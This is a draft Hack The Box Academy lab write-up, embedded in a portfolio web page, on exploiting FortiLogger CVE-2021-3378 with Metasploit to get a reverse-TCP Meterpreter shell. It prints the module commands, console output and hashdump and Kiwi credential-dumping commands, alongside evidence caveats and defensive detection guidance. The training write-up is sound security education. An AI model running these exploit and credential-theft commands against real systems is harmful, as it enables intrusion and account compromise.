@@ -1,0 +1,515 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#11151d"><meta name="description" content="Nero — Cybersecurity research notes, detection engineering, practical labs and documented CVEs."><link rel="icon" href="/favicon.svg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/styles.css"><title>Nero Security — Cybersecurity Portfolio</title></head><body><header class="main-header"><div class="header-inner"><a class="brand" href="/">N<span>ERO.</span><small>SECURITY NOTES</small></a><nav aria-label="Primary navigation"><a href="/">Home</a><a href="/research/">Research</a><a href="/projects/">Projects</a><a href="/writeups/">Write-ups</a><a href="/about/">About</a></nav><a class="header-link" href="https://github.com/NeroPQ" target="_blank" rel="noopener noreferrer">GitHub ↗</a></div></header><main>
+    <div class="page-shell two-column">
+      <article class="content-column wu-article">
+
+        <div class="detail-breadcrumb">
+          <a href="/writeups/">← All write-ups</a>
+          <span>Hack The Box Academy</span>
+        </div>
+
+        <header class="wu-article-header">
+          <div class="eyebrow">
+            EXPLOITATION FRAMEWORKS
+            / HACK THE BOX ACADEMY
+          </div>
+
+          <h1>HTB Academy — Meterpreter: FortiLogger Exploitation and SAM Dump Troubleshooting</h1>
+          <p>Full FortiLogger and Meterpreter technical report recovered from the existing Kali draft. Screenshot evidence remains pending.</p>
+
+          <div class="wu-detail-meta">
+            <span>DRAFT — EVIDENCE PENDING</span>
+            <span>Documented: 2026-11-02</span>
+          </div>
+
+          <div class="wu-tags">
+            <span>HTB Academy</span><span>Metasploit</span><span>Meterpreter</span><span>FortiLogger</span><span>Technical Investigation</span>
+          </div>
+
+          <a
+            class="wu-official"
+            href="https://academy.hackthebox.com/course/preview/using-the-metasploit-framework"
+            target="_blank"
+            rel="noopener noreferrer"
+          >
+            Official platform page ↗
+          </a>
+        </header>
+
+        <div class="wu-article-body">
+
+          <div class="wu-markdown"><hr>
+<h2>title: &quot;HTB Academy — Meterpreter: FortiLogger Exploitation and SAM Dump Troubleshooting&quot;
+platform: &quot;Hack The Box Academy&quot;
+module: &quot;Using the Metasploit Framework&quot;
+section: &quot;Meterpreter&quot;
+category: &quot;Exploitation / Post-Exploitation&quot;
+slug: &quot;htb-metasploit&quot;
+status: &quot;EVIDENCE PENDING&quot;
+classification: &quot;DOCUMENTED PRACTICE&quot;
+observed_date: &quot;2026-10-30&quot;
+publication: &quot;unpublished-draft&quot;
+source: &quot;<a href="https://academy.hackthebox.com/course/preview/using-the-metasploit-framework">https://academy.hackthebox.com/course/preview/using-the-metasploit-framework</a>&quot;</h2>
+<h1>HTB Academy — Meterpreter: FortiLogger Exploitation and SAM Dump Troubleshooting</h1>
+<h2>1. Overview</h2>
+<p>This write-up documents the <strong>Meterpreter</strong> hands-on exercise within Hack The Box Academy&#39;s <strong>Using the Metasploit Framework</strong> module. Its scope is one Windows web-service exploitation exercise, not completion of the entire HTB Academy module.</p>
+<p>The attack reproduced a FortiLogger arbitrary-file-upload vulnerability associated with <strong>CVE-2021-3378</strong>. All exploitation described here belongs to an authorized, ephemeral training target.</p>
+<p>The user-submitted Metasploit transcript verifies that the application check identified <strong>FortiLogger 4.4.2.2</strong>, that the payload was uploaded and invoked, and that a <strong>Meterpreter session (session 2)</strong> opened.</p>
+<p>A subsequent <code>hashdump</code> attempt returned:</p>
+<p><code>Operation failed: Incorrect function.</code></p>
+<p>No <code>getuid</code>, <code>sysinfo</code>, <code>getprivs</code>, Kiwi SAM output, or screenshot is present in the accessible lab evidence.</p>
+<p>Consequently, this report does <strong>not</strong> claim independently verified SYSTEM privileges, an NTLM hash extraction, or completion of both exercise questions.</p>
+<p><strong>Assessment:</strong></p>
+<ul>
+<li>Exploitation and session establishment: VERIFIED.</li>
+<li>Credential-dump objective: NOT VERIFIED.</li>
+<li>Overall publication status: EVIDENCE PENDING.</li>
+</ul>
+<h2>2. Learning Objectives</h2>
+<p>The exercise trains the operator to:</p>
+<ol>
+<li>Identify an applicable Metasploit exploit module for a vulnerable web service.</li>
+<li>Configure the target and reverse callback.</li>
+<li>Interpret automatic vulnerability checks.</li>
+<li>Distinguish payload generation, upload, execution, and an established session.</li>
+<li>Inspect the security context of a Meterpreter process.</li>
+<li>Understand post-exploitation constraints when accessing Windows local account hashes.</li>
+<li>Troubleshoot failed post-exploitation operations without incorrectly claiming success.</li>
+<li>Correlate insecure file uploads with endpoint and network detection opportunities.</li>
+</ol>
+<h2>3. Technical Background</h2>
+<h3>3.1 FortiLogger and CVE-2021-3378</h3>
+<p>FortiLogger is a web-accessible log-management application.</p>
+<p>CVE-2021-3378 concerns an unsafe upload path in affected versions, allowing an unauthenticated attacker to place a file of an unintended type where server-side processing can later execute it.</p>
+<p>Rapid7 documents the application-specific request path:</p>
+<p><code>Config/SaveUploadedHotspotLogoFile</code></p>
+<p>It also identifies a subsequent executable resource:</p>
+<p><code>Assets/temp/hotspot/img/logohotspot.asp</code></p>
+<p>These paths describe the published vulnerability mechanics. The submitted lab transcript does not include captured HTTP traffic proving those particular requests on this instance.</p>
+<p>The corresponding Metasploit module is:</p>
+<pre><code class="language-text">exploit/windows/http/fortilogger_arbitrary_fileupload
+</code></pre>
+<p>The module exploits an unauthenticated arbitrary file upload through an insecure HTTP POST request.</p>
+<p>Its published implementation targets affected FortiLogger releases below version 5.2.0 and uses TCP port 5000 by default.</p>
+<p>The module documentation also acknowledges potential artifacts on disk, indicators in application logs, and unreliable sessions.</p>
+<p>A vulnerable-version check alone is not proof of code execution. In the observed lab, however, Metasploit subsequently reported an established Meterpreter session.</p>
+<h3>3.2 Meterpreter and Windows Account Hashes</h3>
+<p>Meterpreter is Metasploit&#39;s extensible post-exploitation session environment.</p>
+<p>The session&#39;s account token, process architecture, and effective privileges materially affect privileged operations.</p>
+<p>Windows uses the Security Account Manager (SAM) database to store credential-related information for local accounts.</p>
+<p>An NT hash is a 32-character hexadecimal representation of credential material. It is different from an LM hash and is not the account&#39;s plaintext password.</p>
+<p>Windows protects access to these resources.</p>
+<p>Meterpreter&#39;s <code>hashdump</code> command and Kiwi&#39;s <code>lsa_dump_sam</code> command provide different interfaces for accessing local credential material.</p>
+<p>Their success depends on execution context, permissions, compatibility, and operating-system protections.</p>
+<p>An established Meterpreter session must not automatically be treated as evidence of <code>NT AUTHORITY\SYSTEM</code> privileges.</p>
+<h2>4. Lab Environment and Scope</h2>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Observed Information</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Platform</td>
+<td>Hack The Box Academy</td>
+</tr>
+<tr>
+<td>Module</td>
+<td>Using the Metasploit Framework</td>
+</tr>
+<tr>
+<td>Section</td>
+<td>Meterpreter</td>
+</tr>
+<tr>
+<td>Target application</td>
+<td>FortiLogger 4.4.2.2</td>
+</tr>
+<tr>
+<td>Vulnerability</td>
+<td>CVE-2021-3378</td>
+</tr>
+<tr>
+<td>Exploit module</td>
+<td>fortilogger_arbitrary_fileupload</td>
+</tr>
+<tr>
+<td>Target IP</td>
+<td>10.129.203.65</td>
+</tr>
+<tr>
+<td>Reverse callback</td>
+<td>10.10.14.26:4444</td>
+</tr>
+<tr>
+<td>Target connection port</td>
+<td>49687</td>
+</tr>
+<tr>
+<td>Payload stage size</td>
+<td>190534 bytes</td>
+</tr>
+<tr>
+<td>Meterpreter session</td>
+<td>Session 2</td>
+</tr>
+<tr>
+<td>Operating system build</td>
+<td>Not verified</td>
+</tr>
+<tr>
+<td>Session account</td>
+<td>Not verified</td>
+</tr>
+<tr>
+<td>NTLM hash</td>
+<td>Not verified</td>
+</tr>
+</tbody></table>
+<p>The target and callback addresses are temporary HTB Academy lab addresses, not public production hosts.</p>
+<p>The recorded session timestamp was:</p>
+<p><code>2026-10-30 16:15:45 -0400</code></p>
+<p>No packet capture, Nmap output, browser screenshot, or independently recorded HTTP request was available for this exercise.</p>
+<h2>5. Reconnaissance and Module Selection</h2>
+<p>The preceding investigation identified FortiLogger as the service to target.</p>
+<p>The relevant Metasploit exploit was:</p>
+<pre><code class="language-text">exploit/windows/http/fortilogger_arbitrary_fileupload
+</code></pre>
+<p>The original enumeration commands, <code>search</code> output, and <code>show options</code> output were not captured in the user-provided terminal evidence.</p>
+<p>The following commands reconstruct the standard workflow.</p>
+<p><strong>Illustrative example — not a verbatim historical transcript:</strong></p>
+<pre><code class="language-bash">msfconsole -q
+search fortilogger
+use exploit/windows/http/fortilogger_arbitrary_fileupload
+
+show options
+
+set RHOSTS &lt;LAB_TARGET_IP&gt;
+set RPORT 5000
+set LHOST &lt;LAB_VPN_INTERFACE_OR_IP&gt;
+set LPORT 4444
+
+check
+run
+</code></pre>
+<p>Port 5000 is the default configured by the published Rapid7 module.</p>
+<p>The exact historical values of all exploit options and the selected payload architecture are not independently verified by the submitted transcript.</p>
+<p><strong>Evidence Pending — Enumeration</strong></p>
+<p>Required: an authentic screenshot showing the target&#39;s service identification, relevant port enumeration, and Metasploit module selection.</p>
+<p>No original screenshot is currently available.</p>
+<h2>6. Methodology and Practical Walkthrough</h2>
+<h3>6.1 Execute the FortiLogger Exploit</h3>
+<p><strong>Status: VERIFIED</strong></p>
+<p><strong>Objective:</strong> Validate the vulnerable application and attempt controlled remote code execution on the authorized training target.</p>
+<p><strong>Actual recorded command:</strong></p>
+<pre><code class="language-text">[msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) &gt;&gt; run
+</code></pre>
+<p><strong>Actual observed output:</strong></p>
+<pre><code class="language-text">[*] Started reverse TCP handler on 10.10.14.26:4444
+[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)
+[+] The target is vulnerable. FortiLogger version 4.4.2.2
+[+] Generate Payload
+[+] Payload has been uploaded
+[*] Executing payload...
+[*] Sending stage (190534 bytes) to 10.129.203.65
+[*] Meterpreter session 2 opened (10.10.14.26:4444 -&gt; 10.129.203.65:49687) at 2026-10-30 16:15:45 -0400
+</code></pre>
+<p><strong>Technical interpretation:</strong></p>
+<p>The automatic check identified FortiLogger version 4.4.2.2 as vulnerable.</p>
+<p>Metasploit then generated the payload, uploaded it, and attempted execution.</p>
+<p>The reverse TCP handler received a connection, delivered the Meterpreter stage, and reported that session 2 opened.</p>
+<p>The session-opening event supports the conclusion that this exploit attempt achieved an interactive Meterpreter session.</p>
+<p>It does not independently establish the security identity or privilege level of that session.</p>
+<p><strong>Evidence Pending — Exploit Execution</strong></p>
+<p>Required screenshot: the original terminal displaying the vulnerability check, payload upload, stage delivery, and successful Meterpreter session.</p>
+<p>The evidence currently consists of an authentic user-submitted text transcript, not an image.</p>
+<h3>6.2 Inspect the Meterpreter Security Context</h3>
+<p><strong>Status: NOT RECORDED</strong></p>
+<p><strong>Objective:</strong> Identify the Windows account associated with the Meterpreter server process and verify the execution environment before attempting privileged operations.</p>
+<p>Recommended diagnostic commands:</p>
+<pre><code class="language-text">getuid
+sysinfo
+getprivs
+</code></pre>
+<p>These commands were suggested during troubleshooting but their execution results were not supplied.</p>
+<p><code>getuid</code> identifies the account associated with the Meterpreter session.</p>
+<p><code>sysinfo</code> reports information about the target system and architecture.</p>
+<p><code>getprivs</code> lists privileges associated with the current process token.</p>
+<p>A third-party walkthrough referenced the account <code>NT AUTHORITY\SYSTEM</code>. That answer is not evidence of a successful <code>getuid</code> command in this user&#39;s session.</p>
+<p><strong>Evidence Pending — Session Identity</strong></p>
+<p>Required screenshot: actual Meterpreter output showing the session username and system information.</p>
+<p>No verified result is available.</p>
+<h3>6.3 Attempt to Retrieve SAM Credential Material</h3>
+<p><strong>Status: FAILED — VERIFIED</strong></p>
+<p><strong>Objective:</strong> Retrieve the NTLM hash associated with the local training account <code>htb-student</code>.</p>
+<p><strong>Actual command and terminal output:</strong></p>
+<pre><code class="language-text">(Meterpreter 2)(C:\Windows\system32) &gt; hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
+(Meterpreter 2)(C:\Windows\system32) &gt;
+</code></pre>
+<p><strong>Technical interpretation:</strong></p>
+<p>The <code>hashdump</code> operation failed.</p>
+<p>The error indicates that Meterpreter could not successfully complete the requested SAM hash retrieval through this interface.</p>
+<p>The failure does not invalidate the previously established Meterpreter session.</p>
+<p>However, no local account records or password hashes were returned in the submitted evidence.</p>
+<p>This result cannot be described as successful credential extraction.</p>
+<p><strong>Evidence Pending — Hashdump Failure</strong></p>
+<p>Required screenshot: the original Meterpreter terminal showing the <code>hashdump</code> command and the exact error.</p>
+<p>The user-provided text output is available and preserved.</p>
+<h3>6.4 Alternative Post-Exploitation Checks</h3>
+<p><strong>Status: RECOMMENDED — NOT VERIFIED</strong></p>
+<p>The following commands were suggested for further investigation:</p>
+<pre><code class="language-text">getuid
+sysinfo
+getprivs
+load kiwi
+lsa_dump_sam
+</code></pre>
+<p>These commands would help characterize the active session and investigate an alternative interface for reading local SAM information in the authorized laboratory.</p>
+<p>No output confirming their execution or success was provided.</p>
+<p>The public walkthrough hash mentioned earlier in the conversation has intentionally been excluded because importing another operator&#39;s answer would undermine the evidence standard.</p>
+<p><strong>Evidence Pending — Follow-Up Verification</strong></p>
+<p>Required screenshot, if these steps were performed: authentic terminal output showing the follow-up commands and results.</p>
+<h2>7. Results and Verification</h2>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Evidence</th>
+<th>Assessment</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>FortiLogger version identified</td>
+<td>Automatic check</td>
+<td>Verified</td>
+</tr>
+<tr>
+<td>Vulnerable version reported</td>
+<td>Metasploit check</td>
+<td>Verified</td>
+</tr>
+<tr>
+<td>Payload uploaded</td>
+<td>Metasploit output</td>
+<td>Verified</td>
+</tr>
+<tr>
+<td>Payload execution attempted</td>
+<td>Metasploit output</td>
+<td>Verified</td>
+</tr>
+<tr>
+<td>Meterpreter session established</td>
+<td>Session 2 opened</td>
+<td>Verified</td>
+</tr>
+<tr>
+<td>SYSTEM privileges</td>
+<td>No getuid output</td>
+<td>Unverified</td>
+</tr>
+<tr>
+<td>SAM dump completed</td>
+<td>hashdump error</td>
+<td>Not achieved</td>
+</tr>
+<tr>
+<td>htb-student NTLM hash</td>
+<td>No actual dump output</td>
+<td>Unverified</td>
+</tr>
+<tr>
+<td>HTB answer submission</td>
+<td>No confirmation</td>
+<td>Unverified</td>
+</tr>
+</tbody></table>
+<p>The observed exercise demonstrates successful initial exploitation and session establishment.</p>
+<p>It does not demonstrate successful credential extraction.</p>
+<p>Therefore, the appropriate classification is <strong>DOCUMENTED PRACTICE</strong>, with publication status <strong>EVIDENCE PENDING</strong>.</p>
+<h2>8. Troubleshooting</h2>
+<h3>8.1 Observed Error</h3>
+<p>The main error was:</p>
+<pre><code class="language-text">priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
+</code></pre>
+<h3>8.2 Potential Causes</h3>
+<p>The submitted terminal output alone cannot identify the definitive root cause.</p>
+<p>Possible conditions worth investigating include:</p>
+<ul>
+<li>Unexpected session account privileges.</li>
+<li>Differences between payload and target process architectures.</li>
+<li>API invocation or Meterpreter compatibility problems.</li>
+<li>Windows security restrictions.</li>
+<li>Limitations of the selected SAM extraction interface.</li>
+</ul>
+<p>These are diagnostic hypotheses, not confirmed findings.</p>
+<h3>8.3 Recommended Diagnostic Sequence</h3>
+<p>First, record the security identity:</p>
+<pre><code class="language-text">getuid
+</code></pre>
+<p>Next, inspect the system and process context:</p>
+<pre><code class="language-text">sysinfo
+getprivs
+</code></pre>
+<p>Finally, investigate compatibility with the appropriate post-exploitation extension.</p>
+<p>The conversation proposed Kiwi, but contained no confirmation of a successful resolution.</p>
+<p>Re-running the initial exploit is not inherently necessary simply because a post-exploitation function fails.</p>
+<h3>8.4 Resolution Status</h3>
+<p>The credential-dumping issue remained unresolved in the submitted evidence.</p>
+<p>No successful SAM dump or alternative credential extraction was verified.</p>
+<h2>9. Security Implications</h2>
+<p>An unauthenticated arbitrary-file-upload vulnerability can convert an application-layer weakness into operating-system code execution.</p>
+<p>Its impact depends on the execution context of the vulnerable service, network reachability, filesystem permissions, and isolation controls.</p>
+<p>In this lab, the Meterpreter callback demonstrated that application exposure was sufficient to establish a remote interactive session.</p>
+<p>That is a meaningful security impact even without confirmed administrative access.</p>
+<p>At the same time, it is important to distinguish access to an interactive session from access to privileged credential stores.</p>
+<p>The failed <code>hashdump</code> command does not prove that the system was adequately protected against every credential-access technique. It only establishes that this specific attempt did not succeed.</p>
+<h2>10. Defensive Perspective and SOC/DFIR Relevance</h2>
+<h3>10.1 Preventive Controls</h3>
+<p>Organizations should:</p>
+<ul>
+<li>Upgrade affected FortiLogger installations in accordance with vendor guidance.</li>
+<li>Restrict network access to administrative interfaces.</li>
+<li>Enforce server-side file type and content validation.</li>
+<li>Store uploaded files outside executable web directories.</li>
+<li>Disable script execution in upload locations.</li>
+<li>Apply least privilege to application services.</li>
+<li>Monitor and restrict unexpected outbound connections.</li>
+</ul>
+<h3>10.2 Detection Opportunities</h3>
+<p>Defenders should investigate unusual HTTP POST requests associated with the FortiLogger upload workflow.</p>
+<p>Relevant indicators may include:</p>
+<ul>
+<li>Requests to the vulnerable logo-upload functionality.</li>
+<li>Creation of unexpected executable files in web-accessible directories.</li>
+<li>Subsequent access to uploaded ASP content.</li>
+<li>Suspicious child processes spawned by the hosting service.</li>
+<li>Unexpected outbound TCP sessions.</li>
+<li>Changes to application directories following an upload.</li>
+</ul>
+<h3>10.3 Recommended Telemetry</h3>
+<p>Potential investigation sources include:</p>
+<ul>
+<li>Web server and application access logs.</li>
+<li>Windows Security Event ID 4688 when process auditing is enabled.</li>
+<li>Sysmon Event ID 1 for process creation, if Sysmon is deployed.</li>
+<li>Network connection telemetry.</li>
+<li>Endpoint detection and response process trees.</li>
+<li>File-creation monitoring.</li>
+<li>Application error logs.</li>
+</ul>
+<p>These are recommended detection sources and were not collected in the submitted lab evidence.</p>
+<h3>10.4 Detection Correlation</h3>
+<p>A useful sequence for SOC investigation is:</p>
+<pre><code class="language-text">Unauthenticated HTTP Upload
+        |
+        v
+Unexpected File Creation
+        |
+        v
+Request to Uploaded Executable Content
+        |
+        v
+Suspicious Process Execution
+        |
+        v
+Outbound Reverse Connection
+        |
+        v
+Potential Interactive Compromise
+</code></pre>
+<p>This sequence is a generalized defensive model.</p>
+<p>For the actual HTB exercise, the directly available evidence consists of the Metasploit console reports of successful upload, execution, and session establishment.</p>
+<p>A real-world investigation should independently corroborate those events with web, file, process, and network telemetry.</p>
+<h2>11. Lessons Learned</h2>
+<p><strong>Lesson 1 — Separate exploitation stages.</strong></p>
+<p>A vulnerability check, payload upload, execution attempt, and established session are different technical outcomes.</p>
+<p><strong>Lesson 2 — Verify the security context.</strong></p>
+<p>An active Meterpreter session does not automatically imply SYSTEM privileges.</p>
+<p><strong>Lesson 3 — Treat failed operations as evidence.</strong></p>
+<p>The unsuccessful SAM dump is an important troubleshooting result and should be preserved rather than omitted.</p>
+<p><strong>Lesson 4 — Distinguish references from observations.</strong></p>
+<p>Public exploitation documentation explains how a vulnerability works, but it does not establish what happened on a specific training target.</p>
+<p><strong>Lesson 5 — Preserve evidentiary integrity.</strong></p>
+<p>Third-party walkthrough answers cannot substitute for the operator&#39;s actual terminal output.</p>
+<p><strong>Lesson 6 — Include the defensive perspective.</strong></p>
+<p>Exploitation knowledge becomes more valuable when connected to detection, hardening, incident response, and forensic investigation.</p>
+<h2>12. References</h2>
+<ol>
+<li><p>Hack The Box Academy — Using the Metasploit Framework</p>
+<p><a href="https://academy.hackthebox.com/course/preview/using-the-metasploit-framework">https://academy.hackthebox.com/course/preview/using-the-metasploit-framework</a></p>
+</li>
+<li><p>Rapid7 — FortiLogger Arbitrary File Upload Exploit</p>
+<p><a href="https://www.rapid7.com/db/modules/exploit/windows/http/fortilogger_arbitrary_fileupload/">https://www.rapid7.com/db/modules/exploit/windows/http/fortilogger_arbitrary_fileupload/</a></p>
+</li>
+<li><p>Rapid7 — CVE-2021-3378</p>
+<p><a href="https://www.rapid7.com/db/vulnerabilities/cve-2021-3378/">https://www.rapid7.com/db/vulnerabilities/cve-2021-3378/</a></p>
+</li>
+<li><p>Rapid7 — Metasploit Exploit Source</p>
+<p><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/fortilogger_arbitrary_fileupload.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/fortilogger_arbitrary_fileupload.rb</a></p>
+</li>
+<li><p>Check Point — FortiLogger Arbitrary File Upload Advisory</p>
+<p><a href="https://advisories.checkpoint.com/defense/advisories/public/2021/cpai-2021-0199.html">https://advisories.checkpoint.com/defense/advisories/public/2021/cpai-2021-0199.html</a></p>
+</li>
+</ol>
+<h2>13. Evidence Manifest and Publication Gate</h2>
+<h3>Available Evidence</h3>
+<p>The following evidence was supplied as actual terminal text:</p>
+<ul>
+<li>FortiLogger vulnerability check.</li>
+<li>FortiLogger version 4.4.2.2.</li>
+<li>Payload generation and upload.</li>
+<li>Payload execution attempt.</li>
+<li>Meterpreter stage delivery.</li>
+<li>Meterpreter session 2 opened.</li>
+<li>Failed <code>hashdump</code> command.</li>
+</ul>
+<h3>Evidence Pending</h3>
+<p>Authentic screenshots have not been verified for:</p>
+<ol>
+<li>Enumeration and service discovery.</li>
+<li>Successful exploit and Meterpreter session.</li>
+<li>Meterpreter user identity.</li>
+<li>SAM hashdump failure.</li>
+<li>Subsequent diagnostics, if performed.</li>
+</ol>
+<h3>Publication Decision</h3>
+<p>This article must remain an unpublished draft until the available evidence has been reviewed.</p>
+<p>It must not be automatically inserted into the public Write-ups index.</p>
+<p>The full technical content must be preserved during integration.</p>
+<p>No screenshot may be invented, substituted, or attributed to a different laboratory session.</p>
+<p>The eventual public article must also respect the applicable Hack The Box Academy publication rules and avoid unnecessary disclosure of challenge answers or sensitive credential material.</p>
+<p><strong>Current state: EVIDENCE PENDING.</strong></p>
+</div>
+
+          <section class="wu-section wu-evidence">
+            <div class="eyebrow">EVIDENCE</div>
+            <h2>Supporting screenshots</h2>
+
+            
+                <p>
+                  No screenshots have been attached to this entry yet.
+                  Additional evidence will be added only when recovered
+                  and verified.
+                </p>
+              
+
+            <p class="wu-disclaimer">
+              All exercises were performed in authorized educational
+              environments. Sensitive credentials, hashes and flags
+              are intentionally excluded.
+            </p>
+          </section>
+
+        </div>
+      </article>
+
+      <aside class="sidebar" aria-label="Profile and navigation">
+  <section class="side-card identity-card"><div class="avatar-wrap"><div class="avatar">N<span>.</span></div><span class="avatar-orbit">// NERO</span></div><h2>Phan Thien Quang</h2><p class="handle">@NeroPQ · Ho Chi Minh City</p><p class="bio">Information Assurance student passionate about offensive and defensive cybersecurity, with hands-on experience in penetration testing, SOC operations, vulnerability research, and security engineering.</p><div class="profile-actions"><a class="mini-link" href="https://github.com/NeroPQ" target="_blank" rel="noopener noreferrer">GitHub <span aria-hidden="true">↗</span></a><a class="mini-link" href="https://www.linkedin.com/in/phan-quang-nero/" target="_blank" rel="noopener noreferrer">LinkedIn <span aria-hidden="true">↗</span></a></div></section>
+  <section class="side-card"><div class="side-title">FIELD NOTES <span>01</span></div><a class="side-nav" href="/research/"><span>Vulnerability Research</span><b>04</b></a><a class="side-nav" href="/projects/"><span>Engineering & Projects</span><b>06</b></a><a class="side-nav" href="/writeups/"><span>Platform Write-ups</span><b>06</b></a><a class="side-nav" href="/about/"><span>Experience & Milestones</span><b>↗</b></a></section>
+  <section class="side-card"><div class="side-title">PRACTICE PLATFORMS <span>02</span></div><a class="platform-row" href="https://tryhackme.com/p/N3R0PH4N" target="_blank" rel="noopener noreferrer"><span class="platform-initial">THM</span><span class="platform-item-text"><strong>TryHackMe</strong><small>N3R0PH4N · Top 1% (resume)</small></span> <span aria-hidden="true">↗</span></a><a class="platform-row" href="https://app.hackthebox.com/users/3896988?profile-top-tab=machines&amp;ownership-period=1M&amp;profile-bottom-tab=prolabs" target="_blank" rel="noopener noreferrer"><span class="platform-initial">HTB</span><span class="platform-item-text"><strong>Hack The Box</strong><small>User #3896988 · Hands-on labs</small></span> <span aria-hidden="true">↗</span></a><a class="platform-row" href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer"><span class="platform-initial">PS</span><span class="platform-item-text"><strong>PortSwigger Academy</strong><small>Web security learning · Public academy</small></span> <span aria-hidden="true">↗</span></a><p class="micro-note">Profile ranks can change. PortSwigger links to the public Academy, not account settings.</p></section>
+  <section class="side-card"><div class="side-title">SELECTED HIGHLIGHTS <span>03</span></div><div class="side-achievement"><strong>Top 1%</strong><span>TryHackMe · resume snapshot</span></div><div class="side-achievement"><strong>Top 15</strong><span>THRYVE CTF 2026</span></div><div class="side-achievement"><strong>46th</strong><span>CSCV 2026 · WannaLoSE</span></div><a href="/about/#achievements" class="side-all">More achievements <span>↗</span></a></section>
+</aside>
+    </div>
+  </main><footer class="main-footer"><div><strong>NERO.SEC</strong><span>Research · Build · Document</span></div><small>© <span id="year">2026</span> Phan Thien Quang · Educational research in authorized labs.</small><a href="#top">Back to top ↑</a></footer><script src="/site.js" defer></script></body></html>
